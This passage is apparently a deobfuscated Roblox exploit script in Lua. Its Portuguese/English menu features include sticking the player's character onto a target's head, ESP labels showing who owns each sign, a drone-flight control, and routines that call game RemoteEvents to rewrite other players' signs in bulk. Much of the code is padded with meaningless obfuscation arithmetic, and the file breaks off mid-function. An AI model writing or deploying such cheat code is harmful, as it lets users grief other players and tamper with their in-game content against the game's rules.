	if v4 and num > timePosition then
		local v5 = table.pack(bit32.band(v4, 4294967295))
		local v6 = table.pack(bit32.band(v5[1], 65535))
		local v7 = bit32.band(55216 * v6[1] + bit32.lshift(bit32.band(55216 * bit32.rshift(v5[1], 16) + 29221 * v6[1], 65535), 16), 4294967295)
		local v8 = table.pack(bit32.band(bit32.bnot(v4), 4294967295))
		local v9 = table.pack(bit32.band(v8[1], 65535))
		local n5 = 2324511475 + v7 + bit32.band(55216 * v9[1] + bit32.lshift(bit32.band(55216 * bit32.rshift(v8[1], 16) + 29221 * v9[1], 65535), 16), 4294967295) + 214116777
		v3.Looped = false

		task.spawn(function()
			while rawget(getgenv(), "ChildAnimationTrack") == v3 and v.Parent do
				v3:Play(0)
				v3:AdjustSpeed(n4)
				v3.TimePosition = timePosition
				local n6 = tick() + 1

				while true do
					task.wait(0.03)
					if not (rawget(getgenv(), "ChildAnimationTrack") ~= v3 or not v3.IsPlaying or v3.TimePosition >= num or tick() >= n6) then
						continue
					end
					break
				end

				if rawget(getgenv(), "ChildAnimationTrack") == v3 then
					v3:Stop(0)
				end
			end
		end)
	else
		v3.Looped = true
		v3:Play(0.1)
		v3:AdjustSpeed(n4)
	end

	return true
end

-- payload closure created 188-th (proto #142)
local function payload_fn_188(arg)
	if not arg or arg == "" then
		return
	end
	upv1 = arg
	upv2 = ""
end

-- payload closure created 189-th (proto #143)
local function payload_fn_189(arg)
	upv1 = tostring(arg or ""):match("%d+") or ""

	if upv1 ~= "" then
		upv2(upv1, { Speed = 1 })
	end
end

-- payload closure created 190-th (proto #146)
local function payload_fn_190()
	if upv1 ~= "" then
		upv2(upv1, { Speed = 1 })
		return
	end
	local v = upv3[upv4]

	if v then
		upv2(v.Id, v)
	end
end

-- payload closure created 191-th (proto #148)
local function payload_fn_191(arg)
	upv1 = arg

	if upv2 then
		upv3()
		task.wait(0.1)
		upv4()
	end
end

-- payload closure created 192-th (proto #149)
local function payload_fn_192(arg)
	if arg then
		local n2 = 92499675
		if not upv1 then
			warn("Nenhum jogador selecionado!")
			return
		end
		upv2()
		local n3 = n2 + 344935598 - 279401448

		task.spawn(function()
			if not upv3() then
				warn("Não foi possível iniciar o Glue Child.")
			end
		end)
	else
		upv2()
	end
end

-- payload closure created 193-th (proto #152)
local function payload_fn_193(arg)
	local str = arg:lower()

	for _, player in ipairs(upv1:GetPlayers()) do
		if player ~= upv2 and player.Name:lower():sub(1, #str) == str then
			return player
		end
	end

	return nil
end

-- payload closure created 194-th (proto #154)
local function payload_fn_194()
	if upv1 then
		upv1:Disconnect()
		upv1 = nil
	end

	local character = upv2.Character

	if character then
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		local humanoid = character:FindFirstChildOfClass("Humanoid")

		if humanoidRootPart then
			humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
			humanoidRootPart.AssemblyAngularVelocity = Vector3.zero

			if upv3 and upv3.Character then
				local humanoidRootPart2 = upv3.Character:FindFirstChild("HumanoidRootPart")

				if humanoidRootPart2 then
					humanoidRootPart.CFrame = humanoidRootPart2.CFrame * CFrame.new(0, 0, 3)
				end
			end
		end

		if humanoid then
			humanoid.Sit = false
		end
	end

	upv4 = false
	upv3 = nil
end

-- payload closure created 195-th (proto #151)
local function payload_fn_195(arg)
	local v = upv1(arg)

	if v then
		upv2 = v.Name
		upv3:SetCore("SendNotification", { Title = "Alvo Selecionado", Text = "Jogador: " .. upv2, Duration = 3 })
	else
		upv2 = nil
	end
end

-- payload closure created 196-th (proto #t433)
local function payload_fn_196(arg)
	local n2 = 383240993
	local character = upv1.Character
	if not character or not arg or not arg.Character then
		return
	end
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	local head = arg.Character:FindFirstChild("Head")
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoidRootPart or not head or not humanoid then
		return
	end
	local v = table.pack(bit32.band(n2, 4294967295))
	local v2 = table.pack(bit32.band(v[1], 65535))
	local n3 = bit32.band(47019 * v2[1] + bit32.lshift(bit32.band(47019 * bit32.rshift(v[1], 16) + 6007 * v2[1], 65535), 16), 4294967295) + 3614732898
	local v3 = table.pack(bit32.band(bit32.bor(n2, 76713254), 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local v5 = bit32.band(37034 * v4[1] + bit32.lshift(bit32.band(37034 * bit32.rshift(v3[1], 16) + 53520 * v4[1], 65535), 16), 4294967295)
	local v6 = table.pack(bit32.band(bit32.bxor(n2, 76713254), 4294967295))
	local v7 = table.pack(bit32.band(v6[1], 65535))
	local n4 = n3 + v5 + bit32.band(47020 * v7[1] + bit32.lshift(bit32.band(47020 * bit32.rshift(v6[1], 16) + 6007 * v7[1], 65535), 16), 4294967295)
	humanoid.Sit = true
	upv2 = true
	upv3 = arg
	local v8 = bit32.bxor(n4, 61580619)

	upv6 = upv4.Heartbeat:Connect(function()
		if character and arg.Character and head then
			humanoidRootPart.CFrame = head.CFrame * CFrame.new(0, head.Size.Y / 2 + 1.2, 0)
			humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
		else
			upv5()
		end
	end)
end

-- payload closure created 197-th (proto #153)
local function payload_fn_197(arg)
	if arg then
		if not upv1 then
			upv2:SetCore("SendNotification", { Title = "Erro", Text = "Nenhum jogador selecionado." })
			return
		end
		local v = upv3:FindFirstChild(upv1)

		if v and v ~= upv4 then
			upv5(v)
		else
			upv2:SetCore("SendNotification", { Title = "Erro", Text = "Jogador alvo não encontrado." })
		end
	else
		upv6()
	end
end

-- payload closure created 198-th (proto #155)
local function payload_fn_198(arg, arg2)
	local flag = false

	if not upv1 then
		arg2 = flag
	end

	return arg2 or arg
end

-- payload closure created 199-th (proto #t8564)
local function payload_fn_199(arg)
	local n2 = 4818098333

	pcall(function()
		upv1:SetCore("SendNotification", { Title = upv2("Placas", "Signs"), Text = arg, Duration = 4 })
	end)
end

-- payload closure created 200-th (proto #t284)
local function payload_fn_200(arg)
	local n2 = 4203696858
	local n3 = 3839496833
	local n4 = 3074095691
	if not arg or not arg.Parent or arg.Name ~= "BoardNumberString" or not arg:IsA("StringValue") or arg.Value == "" then
		return nil
	end
	local parent = arg.Parent
	local v = upv1[parent.Name]
	if not v then
		return nil
	end
	local workspaceCom = workspace:FindFirstChild("WorkspaceCom")
	if not workspaceCom or not arg:IsDescendantOf(workspaceCom) then
		return nil
	end
	local parent2 = parent.Parent
	local v2 = nil
	local v3

	while true do
		local flag = parent2 and parent2 ~= workspaceCom
		v3 = nil

		if flag then
			if not v2 and parent2:IsA("BasePart") then
				v2 = parent2
			end

			if parent2:IsA("Model") and (parent2:GetAttribute("Player") ~= nil or parent2.Name:sub(1, 4) == "Prop") then
				v3 = parent2
				break
			else
				parent2 = parent2.Parent
				continue
			end
		end

		break
	end

	if not v3 then
		return nil
	end
	local num = tonumber(v3:GetAttribute("Player"))
	local playerByUserId = num and upv2:GetPlayerByUserId(num)
	playerByUserId = playerByUserId and playerByUserId.Name or v3.Name:match("^Prop(.+)")

	if not playerByUserId then
		playerByUserId = tostring(num or upv3("Desconhecido", "Unknown"))
	end

	local tbl = { number = arg, id = arg.Value, command = v, prop = v3, owner = playerByUserId }
	tbl.anchor = v2 or v3.PrimaryPart or v3:FindFirstChildWhichIsA("BasePart", true)
	tbl.kind = tostring(v3:GetAttribute("id") or parent.Name)
	return tbl
end

-- payload closure created 201-th (proto #t8082)
local function payload_fn_201()
	local tbl = {}
	local n2 = 606997202
	local workspaceCom = workspace:FindFirstChild("WorkspaceCom")
	local v = ipairs
	workspaceCom = workspaceCom and workspaceCom:GetDescendants() or {}

	for k, v2 in v(workspaceCom) do
		if upv1 then
			return {}
		end

		if v2.Name == "BoardNumberString" then
			local v3 = upv2(v2)

			if v3 then
				table.insert(tbl, v3)
			end
		end

		if k % 250 == 0 then
			task.wait()
		end
	end

	table.sort(tbl, function(arg, arg2)
		return arg.owner .. "|" .. arg.kind .. "|" .. arg.id < arg2.owner .. "|" .. arg2.kind .. "|" .. arg2.id
	end)

	local tbl2 = {}

	for _, v2 in ipairs(tbl) do
		local str = v2.owner .. " | " .. v2.kind .. " | #" .. v2.id
		tbl2[str] = (tbl2[str] or 0) + 1
		v2.label = str .. (tbl2[str] > 1 and " (" .. tbl2[str] .. ")" or "")
	end

	return tbl
end

-- payload closure created 202-th (proto #t9477)
local function payload_fn_202()
	local tbl = {}
	upv1 = {}
	local label = nil

	for _, v in ipairs(upv2) do
		if not upv3 or v.owner == upv3 then
			table.insert(tbl, v.label)
			upv1[v.label] = v

			if v.number == upv4 then
				label = v.label
			end
		end
	end

	if not label then
		upv4 = nil
	end

	if upv5 then
		upv6 = true
		upv5:Set(tbl)
		upv5:Set(label or "")
		upv6 = false
	end
end

-- payload closure created 203-th (proto #t4586)
local function payload_fn_203()
	local tbl = {}
	local tbl2 = {}

	for _, v in ipairs(upv1) do
		tbl2[v.owner] = (tbl2[v.owner] or 0) + 1
	end

	for k in pairs(tbl2) do
		table.insert(tbl, k)
	end

	table.sort(tbl)
	table.insert(tbl, 1, upv2)

	if upv3 and not tbl2[upv3] then
		upv3 = nil
	end

	if upv4 then
		upv5 = true
		upv4:Set(tbl)
		upv4:Set(upv3 or upv2)
		upv5 = false
	end

	upv6()
end

-- payload closure created 204-th (proto #158)
local function payload_fn_204()
	if upv1 then
		upv1:Destroy()
		upv1 = nil
	end

	table.clear(upv2)
end

-- payload closure created 205-th (proto #t2185)
local function payload_fn_205()
	local n2 = 324238440
	local n3 = 522351051
	local n4 = 1829627564
	local flag = not upv1

	if not flag then
		flag = upv2
		local n5 = bit32.band(n4, n3) - 2683468252
	end

	if flag then
		return
	end
	local n5 = n2 + 39666352
	local playerGui = upv3.LocalPlayer:FindFirstChild("PlayerGui")
	if not playerGui then
		return
	end
	local flag2 = not upv4
	local n6 = n5 + 204416562

	if flag2 or not upv4.Parent then
		upv5()
		upv4 = Instance.new("Folder")
		upv4.Name = "__CoquettePlateOwnerESP_v2"
		upv4.Parent = playerGui
	end

	local tbl = {}

	local function fn(arg, arg2, adornee, arg3, text)
		local v = bit32.bxor(n6, 3661702081)
		local n7 = 2678085535
		if not adornee or not adornee:IsA("BasePart") or not adornee:IsDescendantOf(workspace) then
			return
		end
		tbl[arg2] = true
		local billboardGui = upv6[arg2]

		if not billboardGui or not billboardGui.Parent then
			billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "PlateOwner"
			billboardGui.AlwaysOnTop = true
			billboardGui.Size = UDim2.new(0, 280, 0, 44)
			billboardGui.StudsOffsetWorldSpace = Vector3.new(0, 2.5, 0)
			billboardGui.MaxDistance = 600
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = "Owner"
			textLabel.Size = UDim2.new(1, 0, 1, 0)
			local v2 = Color3
			local v3 = bit32.bxor(n7, 4294967295)
			textLabel.BackgroundColor3 = v2.fromRGB(20, 20, 20)
			textLabel.BackgroundTransparency = 0.25
			textLabel.BorderSizePixel = 0
			textLabel.Font = Enum.Font.GothamBold
			textLabel.TextColor3 = Color3.fromRGB(255, 220, 245)
			textLabel.TextSize = 13
			textLabel.TextWrapped = true
			textLabel.TextStrokeTransparency = 0.4
			textLabel.Parent = billboardGui
			billboardGui.Parent = upv4
			upv6[arg2] = billboardGui
			n7 = v3 + 1061203775
		end

		billboardGui.Adornee = adornee
		billboardGui.Owner.Text = text
	end

	for _, v in ipairs(upv7) do
		fn(158924626, v.number, v.anchor, 359288233, v.label)
	end

	for _, player in ipairs(upv3:GetPlayers()) do
		local sign = player.Character and player.Character:FindFirstChild("Sign")
		local toolSound = sign and sign:FindFirstChild("ToolSound")

		if toolSound and toolSound:IsA("RemoteEvent") then
			fn(158924626, toolSound, sign:IsA("BasePart") and sign or sign:FindFirstChildWhichIsA("BasePart", true), 192112298, player.Name .. " | Tool")
		end
	end

	for k, v in pairs(upv6) do
		if not tbl[k] then
			v:Destroy()
			upv6[k] = nil
		end
	end
end

-- payload closure created 206-th (proto #t9305)
local function payload_fn_206()
	upv2 = upv1()
	if upv3 then
		return
	end
	upv4()
	upv5()
end

-- payload closure created 207-th (proto #157)
local function payload_fn_207()
	for _, v in ipairs(upv1) do
		v:Disconnect()
	end

	table.clear(upv1)
end

-- payload closure created 208-th (proto #t1991)
local function payload_fn_208()
	local n2 = 15352083
	local flag = type(0) ~= "number"
	if not upv1 or upv2 or upv3 then
		return
	end
	upv2 = true
	local n3 = n2 + 203532388 + 206479530

	task.delay(0.3, function()
		upv2 = false
		if not upv1 or upv3 then
			return
		end

		if upv4 then
			upv5()
			return
		end
		upv4 = true
		local ok2, result2 = pcall(upv6)
		upv4 = false

		if not ok2 then
			warn("[Coquette signs] " .. tostring(result2))
		end
	end)
end

-- payload closure created 209-th (proto #t20)
local function payload_fn_209(arg)
	upv1 = arg == true
	local n2 = 113749393
	upv2()
	if not upv1 then
		upv3()
		return
	end

	local function fn(descendant)
		if descendant.Name == "BoardNumberString" or descendant.Name == "ToolSound" then
			upv4()
		end
	end

	table.insert(upv5, workspace.DescendantAdded:Connect(fn))
	table.insert(upv5, workspace.DescendantRemoving:Connect(fn))
	table.insert(upv5, upv6.PlayerAdded:Connect(upv4))
	table.insert(upv5, upv6.PlayerRemoving:Connect(upv4))
	upv7()
	upv4()
end

-- payload closure created 210-th (proto #156)
local function payload_fn_210()
	upv1 = true
	upv2 = false
	upv3()
	upv4()
end

-- payload closure created 211-th (proto #162)
local function payload_fn_211(arg)
	local n2 = 499060101
	local flag = type(0) == "buffer"
	if upv1 then
		return
	end

	if upv2 then
		upv3(upv4("Aguarde a operação atual.", "Wait for the current operation."))
		return
	end
	local v = upv5
	local v2 = upv6
	local v3 = upv7
	if arg == "one" and not v then
		upv3(upv4("Selecione uma placa disponível.", "Select an available sign."))
		return
	end

	if arg == "owner" and not v2 then
		upv3(upv4("Selecione um dono específico.", "Select a specific owner."))
		return
	end
	upv2 = true
	local n3 = n2 + 296288336 + 130346086

	task.spawn(function()
		local n4 = 813647710

		local ok2, result2 = pcall(function()
			local v4 = bit32.bxor(n4, 3850502106)
			upv8()
			if upv1 or arg == "refresh" then
				return
			end
			local re = upv9:FindFirstChild("RE")
			local n1Cemeter1y = re and re:FindFirstChild("1Cemeter1y")
			if not n1Cemeter1y or not n1Cemeter1y:IsA("RemoteEvent") then
				upv3(upv4("RemoteEvent indisponível.", "RemoteEvent unavailable."))
				return
			end
			local tbl = {}
			local n5 = 0
			local n6 = 0

			for _, v5 in ipairs(upv10) do
				if not upv1 then
					local flag2 = arg == "all" or arg == "one" and v5.number == v
					local flag3

					if flag2 then
						flag3 = flag2
					else
						flag3 = arg == "owner" and v5.owner == v2
					end

					if flag3 then
						local v6 = upv11(v5.number)

						if v6 then
							local str = v6.command .. ":" .. v6.id

							if not tbl[str] then
								tbl[str] = true
								local n7 = 8632455512

								if pcall(function()
									n1Cemeter1y:FireServer(v6.command, v6.id, v3)
								end) then
									n5 += 1
								else
									n6 += 1
								end

								task.wait(0.05)
							end
						end
					end

					continue
				end

				break
			end

			if n5 == 0 and n6 == 0 then
				upv3(upv4("A placa não está mais disponível. Atualize a lista.", "Sign no longer available. Refresh the list."))
				bit32.bxor(bit32.bor(v4, 1906285174), 536937074)
			else
				upv3(string.format(upv4("Enviados: %d; falhas locais: %d. O servidor decide a alteração.", "Sent: %d; local failures: %d. The server decides the change."), n5, n6))
			end
		end)

		upv2 = false

		if not ok2 then
			warn("[Coquette signs] " .. tostring(result2))
			upv3(upv4("Não foi possível concluir. Tente atualizar a lista.", "Could not complete. Try refreshing the list."))
		end
	end)
end

-- payload closure created 212-th (proto #159)
local function payload_fn_212(arg)
	if upv1 or upv2 then
		return
	end
	upv4 = arg ~= upv3 and arg ~= "" and arg or nil
	upv5 = nil
	upv6()
end

-- payload closure created 213-th (proto #160)
local function payload_fn_213(arg)
	if upv1 or upv2 then
		return
	end
	local v = upv3[arg]
	upv4 = v and v.number or nil
end

-- payload closure created 214-th (proto #161)
local function payload_fn_214()
	upv1("refresh")
end

-- payload closure created 215-th (proto #163)
local function payload_fn_215(arg)
	upv1 = tostring(arg or "")
end

-- payload closure created 216-th (proto #164)
local function payload_fn_216()
	upv1("one")
end

-- payload closure created 217-th (proto #165)
local function payload_fn_217(arg)
	if not upv1 then
		upv2(arg)
	end
end

-- payload closure created 218-th (proto #169)
local function payload_fn_218(arg)
	local n2 = 822372114

	pcall(function()
		upv1:SetCore("SendNotification", { Title = "Placas Tool", Text = arg, Duration = 3 })
	end)
end

-- payload closure created 219-th (proto #166)
local function payload_fn_219()
	local tbl = {}

	for _, player in ipairs(upv1:GetPlayers()) do
		local character = player.Character
		character = character and character:FindFirstChild("Sign")
		character = character and character:FindFirstChild("ToolSound")

		if character and character:IsA("RemoteEvent") then
			table.insert(tbl, player.Name)
		end
	end

	table.sort(tbl)
	return tbl
end

-- payload closure created 220-th (proto #167)
local function payload_fn_220(arg)
	upv2 = arg and upv1:FindFirstChild(arg) or nil
end

-- payload closure created 221-th (proto #168)
local function payload_fn_221()
	if upv1 and upv1.Set then
		upv1:Set(upv2())
		upv3("Lista atualizada.")
	end
end

-- payload closure created 223-th (proto #171)
local function payload_fn_223(arg)
	upv1 = tostring(arg or "")
end

-- payload closure created 224-th (proto #176)
local function payload_fn_224(arg, arg2)
	local n2 = 330973783
	local character = arg and arg.Character
	local sign = character and character:FindFirstChild("Sign")
	local toolSound = sign and sign:FindFirstChild("ToolSound")
	local flag = not toolSound
	local v = bit32.bxor(n2, 465973462)
	if flag or not toolSound:IsA("RemoteEvent") then
		return false
	end
	local v2 = pcall
	local v3 = table.pack(bit32.band(v, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local n3 = bit32.band(58553 * v4[1] + bit32.lshift(bit32.band(58553 * bit32.rshift(v3[1], 16) + 4742 * v4[1], 65535), 16), 4294967295) + 4107073227
	local v5 = table.pack(bit32.band(bit32.bor(v, 496205219), 4294967295))
	local v6 = table.pack(bit32.band(v5[1], 65535))
	local v7 = bit32.band(6984 * v6[1] + bit32.lshift(bit32.band(6984 * bit32.rshift(v5[1], 16) + 60793 * v6[1], 65535), 16), 4294967295)
	local v8 = table.pack(bit32.band(bit32.band(v, 496205219), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n4 = n3 + v7 + bit32.band(6982 * v9[1] + bit32.lshift(bit32.band(6982 * bit32.rshift(v8[1], 16) + 60793 * v9[1], 65535), 16), 4294967295)

	return v2(function()
		toolSound:FireServer("Sign", "SignWords", arg2)
	end)
end

-- payload closure created 225-th (proto #173)
local function payload_fn_225(arg)
	local n2 = 4815181223
	if upv1 then
		upv2("A alteração anterior ainda está sendo processada.")
		return
	end
	local tbl = {}

	if arg then
		for _, player in ipairs(upv3:GetPlayers()) do
			table.insert(tbl, player)
		end
	else
		if not upv4 then
			upv2("Selecione um jogador válido.")
			return
		end
		table.insert(tbl, upv4)
	end

	upv1 = true
	local spawn = task.spawn
	local v = bit32.bxor(n2, 361771784)

	spawn(function()
		local n3 = 0

		for i, v2 in ipairs(tbl) do
			if upv5(v2, upv6) then
				n3 += 1
			end

			if i % 20 == 0 then
				task.wait()
			end
		end

		upv1 = false
		upv2(string.format("%d placa(s) Tool atualizada(s).", n3))
	end)
end

-- payload closure created 226-th (proto #172)
local function payload_fn_226()
	upv1(false)
end

-- payload closure created 227-th (proto #174)
local function payload_fn_227()
	upv1(true)
end

-- payload closure created 230-th (proto #178)
local function payload_fn_230()
	local n2 = 2155657693
	local n3 = 991594781
	local n4 = 111067759
	local localPlayer = game.Players.LocalPlayer
	local n5 = 303533340
	local character = localPlayer.Character

	if not character then
		character = localPlayer.CharacterAdded:Wait()
		n5 = bit32.bxor(bit32.bxor(n5, 114718571), 114718571)
	end

	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
	local n6 = 14449476807

	local ok2, result2 = pcall(function()
		return game:GetObjects("rbxassetid://" .. n6)[1]
	end)

	if ok2 and result2 then
		local tbl = {}

		for _, descendant in ipairs(result2:GetDescendants()) do
			if descendant:IsA("BasePart") then
				table.insert(tbl, descendant)
			end
		end

		if #tbl > 0 then
			local v = tbl[1]

			for _, v2 in ipairs(tbl) do
				if v2.Name == "HumanoidRootPart" or v2.Name == "PrimaryPart" then
					v = v2
					break
				end
			end

			result2.PrimaryPart = v
			result2.Parent = workspace
			local cFrame = humanoidRootPart.CFrame
			local lookVector = humanoidRootPart.CFrame.LookVector
			local v2 = bit32.bxor(n4, 476222900)
			result2:SetPrimaryPartCFrame(cFrame + lookVector * 8)
			n4 = bit32.bxor(v2, 476222900)
		end
	end

	game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")
	local v = game
	local v2 = table.pack(bit32.band(n5, 4294967295))
	local v3 = table.pack(bit32.band(v2[1], 65535))
	local n7 = bit32.band(33669 * v3[1] + bit32.lshift(bit32.band(33669 * bit32.rshift(v2[1], 16) + 8414 * v3[1], 65535), 16), 4294967295) + 1088650774
	local v4 = table.pack(bit32.band(bit32.bor(n5, 215526046), 4294967295))
	local v5 = table.pack(bit32.band(v4[1], 65535))
	local v6 = bit32.band(63734 * v5[1] + bit32.lshift(bit32.band(63734 * bit32.rshift(v4[1], 16) + 48706 * v5[1], 65535), 16), 4294967295)
	local v7 = table.pack(bit32.band(bit32.bxor(n5, 215526046), 4294967295))
	local v8 = table.pack(bit32.band(v7[1], 65535))
	local n8 = n7 + v6 + bit32.band(33670 * v8[1] + bit32.lshift(bit32.band(33670 * bit32.rshift(v7[1], 16) + 8414 * v8[1], 65535), 16), 4294967295)
	local RunService = v:GetService("RunService")
	local TweenService = game:GetService("TweenService")
	local v9 = workspace
	local v10 = bit32.bxor(n3, 1840763816)
	local currentCamera = v9.CurrentCamera
	local drone = workspace:WaitForChild("Drone")
	local flag = false
	local v11 = bit32.bxor(n8, 263265548)
	local n9 = 150
	local connection = nil
	local connection2 = nil
	local connection3 = nil
	local bodyVelocity = nil
	local bodyGyro = nil
	local flag2 = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
	local v12 = table.pack(bit32.band(n4, 4294967295))
	local v13 = table.pack(bit32.band(v12[1], 65535))
	local v14 = bit32.band(47905 * v13[1] + bit32.lshift(bit32.band(47905 * bit32.rshift(v12[1], 16) + 39602 * v13[1], 65535), 16), 4294967295)
	local v15 = bit32.bxor(bit32.bxor(v11, 77717082), 50887064)
	local v16 = bit32.bxor(n4, 0)
	local v17 = table.pack(bit32.band(bit32.bor(n4, 464837092), 4294967295))
	local v18 = table.pack(bit32.band(v17[1], 65535))
	local v19 = bit32.band(17632 * v18[1] + bit32.lshift(bit32.band(17632 * bit32.rshift(v17[1], 16) + 25933 * v18[1], 65535), 16), 4294967295)
	local v20 = bit32.band(n4, 464837092)
	local v21 = bit32.bxor(v15, 434715781)
	local v22 = bit32.band(v10, 3906475323)
	local v23 = table.pack(bit32.band(v20, 4294967295))
	local v24 = table.pack(bit32.band(v23[1], 65535))
	local n10 = v14 + 1442947684 + v19 + bit32.band(17630 * v24[1] + bit32.lshift(bit32.band(17630 * bit32.rshift(v23[1], 16) + 25933 * v24[1], 65535), 16), 4294967295)
	local vector_ = Vector3.zero
	local vector_2 = Vector3.zero
	local v25 = bit32.bxor(v21, 465009833)

	local function fn()
		local tbl = {}

		for _, child in ipairs(drone:GetChildren()) do
			if child:IsA("BasePart") then
				table.insert(tbl, child)
			end
		end

		return tbl
	end

	local v26 = table.pack(bit32.band(v25, 4294967295))
	local v27 = table.pack(bit32.band(v26[1], 65535))
	local n11 = bit32.band(64320 * v27[1] + bit32.lshift(bit32.band(64320 * bit32.rshift(v26[1], 16) + 7369 * v27[1], 65535), 16), 4294967295) + 1152800000
	local v28 = table.pack(bit32.band(bit32.bor(411479076, v25), 4294967295))
	local v29 = table.pack(bit32.band(v28[1], 65535))
	local v30 = bit32.band(1217 * v29[1] + bit32.lshift(bit32.band(1217 * bit32.rshift(v28[1], 16) + 58166 * v29[1], 65535), 16), 4294967295)
	local v31 = table.pack(bit32.band(bit32.band(411479076, v25), 4294967295))
	local v32 = table.pack(bit32.band(v31[1], 65535))
	local n12 = n11 + v30 + bit32.band(1215 * v32[1] + bit32.lshift(bit32.band(1215 * bit32.rshift(v31[1], 16) + 58166 * v32[1], 65535), 16), 4294967295)

	local function fn2()
		return fn()[1]
	end

	local function fn3()
		local v33 = fn2()
		if not v33 then
			return
		end

		for _, v34 in ipairs(fn()) do
			if v34 ~= v33 then
				for _, child in ipairs(v34:GetChildren()) do
					if child:IsA("Weld") or child:IsA("WeldConstraint") then
						child:Destroy()
					end
				end

				local weld = Instance.new("Weld")
				weld.Part0 = v33
				weld.Part1 = v34
				local cFrame = v33.CFrame
				weld.C0 = v33.CFrame:Inverse() * cFrame
				local cFrame2 = v34.CFrame
				weld.C1 = v33.CFrame:Inverse() * cFrame2
				weld.Part0 = v33
				weld.Part1 = v34
				weld.Parent = v33
			end
		end
	end

	local function fn4(canCollide)
		for _, v33 in ipairs(fn()) do
			v33.CanCollide = canCollide
		end
	end

	local function fn5(anchored)
		for _, v33 in ipairs(fn()) do
			v33.Anchored = anchored
		end
	end

	local function fn6()
		if bodyVelocity then
			bodyVelocity:Destroy()
		end

		if bodyGyro then
			bodyGyro:Destroy()
		end

		bodyVelocity = nil
		bodyGyro = nil
	end

	local tbl = {
		platformStandOriginal = false,
		character = nil,
		humanoid = nil,
		frozen = false,
		originalCollisions = {},
	}

	local function fn7()
		local character2 = localPlayer.Character
		if not character2 then
			return
		end
		local humanoid = character2:FindFirstChildOfClass("Humanoid")
		if not humanoid then
			return
		end
		tbl.character = character2
		tbl.humanoid = humanoid
		tbl.platformStandOriginal = humanoid.PlatformStand
		humanoid.PlatformStand = true
		tbl.originalCollisions = {}

		for _, descendant in ipairs(character2:GetDescendants()) do
			if descendant:IsA("BasePart") then
				tbl.originalCollisions[descendant] = descendant.CanCollide
				descendant.CanCollide = false
			end
		end

		local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")

		if humanoidRootPart2 then
			humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
			humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
		end

		tbl.frozen = true
	end

	local v33 = bit32.bxor(v16, 4294967295)

	local function fn8()
		if not tbl.frozen then
			return
		end
		local character2 = tbl.character
		local humanoid = tbl.humanoid

		if character2 and humanoid then
			humanoid.PlatformStand = tbl.platformStandOriginal

			for _, descendant in ipairs(character2:GetDescendants()) do
				if descendant:IsA("BasePart") then
					local v34 = tbl.originalCollisions[descendant]

					if v34 ~= nil then
						descendant.CanCollide = v34
					else
						descendant.CanCollide = true
					end
				end
			end
		end

		tbl.frozen = false
		tbl.character = nil
		tbl.humanoid = nil
		tbl.originalCollisions = {}
	end

	local function fn9()
		if not flag then
			return
		end
		local v34 = fn2()
		if not v34 then
			return
		end
		vector_ = vector_:Lerp(vector_2, 0.3)

		if bodyVelocity then
			bodyVelocity.Velocity = vector_
		end

		if bodyGyro then
			bodyGyro.CFrame = v34.CFrame:Lerp(currentCamera.CFrame, 0.2)
		end
	end

	local v34 = bit32.bxor(n10, 151933136)
	local fn10 = nil

	local function fn11()
		local n13 = 277868618

		if connection then
			connection:Disconnect()
		end

		if connection2 then
			connection2:Disconnect()
		end

		local tbl2 = { F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0 }
		local n14 = n13 + 345954255 - 139172154
		flag = true
		vector_2 = Vector3.zero
		vector_ = Vector3.zero

		task.spawn(function()
			local v35 = bit32.bxor(n14, 1575108127)
			local n15 = 3978383426
			local v36 = fn2()
			if not v36 then
				flag = false
				return
			end
			fn4(false)
			fn5(false)
			fn3()
			fn6()
			bodyVelocity = Instance.new("BodyVelocity")
			bodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
			bodyVelocity.Velocity = Vector3.zero
			bodyVelocity.Parent = v36
			bodyGyro = Instance.new("BodyGyro")
			bodyGyro.P = 5000
			bodyGyro.D = 500
			bodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
			bodyGyro.CFrame = v36.CFrame
			bodyGyro.Parent = v36

			while flag and v36 and v36.Parent do
				if tbl2.L + tbl2.R ~= 0 or tbl2.F + tbl2.B ~= 0 or tbl2.Q + tbl2.E ~= 0 then
					local p = currentCamera.CFrame.p
					vector_2 = (currentCamera.CFrame.LookVector * (tbl2.F + tbl2.B) + currentCamera.CFrame * CFrame.new(tbl2.L + tbl2.R, (tbl2.Q + tbl2.E) * 0.2, 0).p - p) * n9
				else
					vector_2 = Vector3.zero
				end

				task.wait()
			end

			fn6()
			fn4(true)
		end)

		connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
			local n15 = 2619621597
			local v35 = bit32.bxor(n14, 2565370366)
			local n16 = 1886394657
			if gameProcessed then
				return
			end
			local n17 = n16 // 7

			if input.KeyCode == Enum.KeyCode.W then
				tbl2.F = 1
			elseif input.KeyCode == Enum.KeyCode.S then
				tbl2.B = -1
			else
				local keyCode = input.KeyCode
				local a = Enum.KeyCode.A

				if keyCode == a then
					tbl2.L = -1
				elseif input.KeyCode == Enum.KeyCode.D then
					tbl2.R = 1
				elseif input.KeyCode == Enum.KeyCode.E then
					local v36 = tbl2
					local v37 = bit32.bor(v35, n17)
					v36.Q = 1
				elseif input.KeyCode == Enum.KeyCode.Q then
					tbl2.E = -1
				end
			end
		end)

		connection2 = UserInputService.InputEnded:Connect(function(input, gameProcessed)
			local n15 = 203814964
			local n16 = 2848716216
			local n17 = 3331650230
			if gameProcessed then
				return
			end

			if input.KeyCode == Enum.KeyCode.W then
				tbl2.F = 0
			elseif input.KeyCode == Enum.KeyCode.S then
				tbl2.B = 0
			else
				local keyCode = input.KeyCode
				local keyCode2 = Enum.KeyCode
